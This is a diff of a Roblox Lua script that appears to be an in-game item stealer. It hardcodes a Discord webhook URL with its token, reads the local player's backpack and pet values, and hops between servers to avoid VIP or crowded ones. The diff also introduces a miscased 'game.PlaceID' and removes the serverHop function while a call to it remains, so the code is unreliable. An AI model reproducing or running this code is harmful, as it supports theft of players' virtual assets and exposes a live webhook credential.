@@ -10,9 +10,12 @@ local ping = _G.pingEveryone or "Yes"
 local webhook = _G.webhook or "https://discord.com/api/webhooks/1444187837762109501/Au5My2ZxWDAdtg7okXOjXBaWvpd4p_36BxCeimgQrOztwzI7sYfMq9euFooL0mckPf8f"
 
 local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-local TeleportService = game:GetService("TeleportService")
 local RunService = game:GetService("RunService")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local PlaceID = game.PlaceID
+
+local plr = Players.LocalPlayer
 local backpack = plr:WaitForChild("Backpack")
 local replicatedStorage = game:GetService("ReplicatedStorage")
 local modules = replicatedStorage:WaitForChild("Modules")
@@ -21,9 +24,7 @@ local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUt
 local petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
 local numberUtil = require(modules:WaitForChild("NumberUtil"))
 local dataService = require(modules:WaitForChild("DataService"))
-local plr = Players.LocalPlayer
 local character = plr.Character or plr.CharacterAdded:Wait()
-local PlaceID = game.PlaceId
 
 --[[
 ================================================================================
@@ -93,6 +94,7 @@ end
 if hopNeeded then
     serverHop()
 end
+
 -- =============================================================================
 
 local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
@@ -137,55 +139,6 @@ if getexecutorname then
     pcall(function()
         executorName = tostring(getexecutorname())
     end)
-end
-
-local function serverHop()
-    local PlaceID = game.PlaceId
-    local ok, req = pcall(function()
-        return request({
-            Url = "https://games.roblox.com/v1/games/"..PlaceID.."/servers/Public?sortOrder=Asc&limit=100"
-        })
-    end)
-    if not ok or not req or not req.Body then
-        pcall(function() TeleportService:Teleport(PlaceID) end)
-        return
-    end
-
-    local decoded = nil
-    pcall(function() decoded = HttpService:JSONDecode(req.Body) end)
-    if not decoded or not decoded.data then
-        pcall(function() TeleportService:Teleport(PlaceID) end)
-        return
-    end
-
-    for _, v in ipairs(decoded.data) do
-        if v.playing < v.maxPlayers and v.id ~= game.JobId then
-            pcall(function() TeleportService:TeleportToPlaceInstance(PlaceID, v.id) end)
-            return
-        end
-    end
-
-    pcall(function() TeleportService:Teleport(PlaceID) end)
-end
-
-if next(users) == nil or webhook == "" then
-    serverHop()
-    return
-end
-
-if game.PlaceId ~= 126884695634066 then
-    serverHop()
-    return
-end
-
-if #Players:GetPlayers() >= 5 then
-    serverHop()
-    return
-end
-
-if pcall(function() return game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() end) == "VIPServer" then
-    serverHop()
-    return
 end
 
 local function calcPetValue(v14)
